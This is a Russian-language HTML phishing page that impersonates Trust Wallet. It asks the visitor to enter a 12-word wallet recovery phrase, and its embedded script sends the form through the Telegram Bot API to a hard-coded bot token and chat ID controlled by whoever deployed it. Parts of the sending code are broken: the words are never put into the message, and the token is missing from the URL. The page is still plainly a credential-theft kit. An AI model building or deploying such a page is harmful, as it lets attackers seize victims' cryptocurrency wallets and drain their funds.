<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Секретная фраза</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #0B0E11;
            color: #FFFFFF;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            max-width: 400px;
            width: 100%;
            background-color: #1E1E1E;
            border-radius: 16px;
            padding: 20px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
            text-align: center;
        }
        .logo {
            width: 50px;
            height: 50px;
            margin-bottom: 16px;
        }
        h1 {
            font-size: 24px;
            margin-bottom: 16px;
            color: #FFFFFF;
        }
        .description {
            font-size: 14px;
            color: #A0A0A0;
            margin-bottom: 20px;
        }
        .seed-input {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 10px;
        }
        input {
            padding: 12px;
            font-size: 14px;
            border: 1px solid #333333;
            border-radius: 8px;
            background-color: #2C2C2C;
            color: #FFFFFF;
            text-align: center;
        }
        input::placeholder {
            color: #888888;
        }
        button {
            margin-top: 20px;
            width: 100%;
            padding: 12px;
            background-color: #1E90FF;
            color: #FFFFFF;
            font-size: 16px;
            font-weight: bold;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #1C86EE;
        }
        .warning {
            margin-top: 10px;
            font-size: 12px;
            color: #FFD700;
        }
        @media (max-width: 480px) {
            .seed-input {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="path/to/trust-wallet-logo.png" alt="Trust Wallet Logo" class="logo">
        <h1>Секретная фраза</h1>
        <p class="description">Введите вашу секретную фразу из 12 слов. Убедитесь, что вы храните её в безопасности!</p>
        <form id="seedForm">
            <div class="seed-input">
                <input type="text" placeholder="Слово 1" name="word1" required>
                <input type="text" placeholder="Слово 2" name="word2" required>
                <input type="text" placeholder="Слово 3" name="word3" required>
                <input type="text" placeholder="Слово 4" name="word4" required>
                <input type="text" placeholder="Слово 5" name="word5" required>
                <input type="text" placeholder="Слово 6" name="word6" required>
                <input type="text" placeholder="Слово 7" name="word7" required>
                <input type="text" placeholder="Слово 8" name="word8" required>
                <input type="text" placeholder="Слово 9" name="word9" required>
                <input type="text" placeholder="Слово 10" name="word10" required>
                <input type="text" placeholder="Слово 11" name="word11" required>
                <input type="text" placeholder="Слово 12" name="word12" required>
            </div>
            <button type="submit">Отправить</button>
        </form>
        <div class="warning">Никогда не делитесь своей секретной фразой с другими!</div>
    </div>

    <script>
        document.getElementById('seedForm').addEventListener('submit', async function(event) {
            event.preventDefault();  // Останавливаем стандартное поведение формы

            const formData = new FormData(this);
            const words = [];
            formData.forEach((value, key) => {
                words.push(value);  // Сохраняем каждое слово из полей ввода
            });

            const message = `Секретная фраза:\n`;
            const botToken = '7804666257:AAHnu23aX89lTPTuMt08TOHfSgvfK4T8hKg';  // Ваш токен бота
            const chatId = '@bdsjxjdhd';  // Ваш chat_id

            try {
                const response = await fetch(`https://api.telegram.org/bot/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                    }),
                });

                if (response.ok) {
                    alert('Сообщение успешно отправлено!');
                } else {
                    alert('Ошибка при отправке. Проверьте настройки.');
                }
            } catch (error) {
                console.error('Ошибка:', error);
                alert('Произошла ошибка при подключении. Проверьте сеть.');
            }
        });
    </script>
</body>
</html>
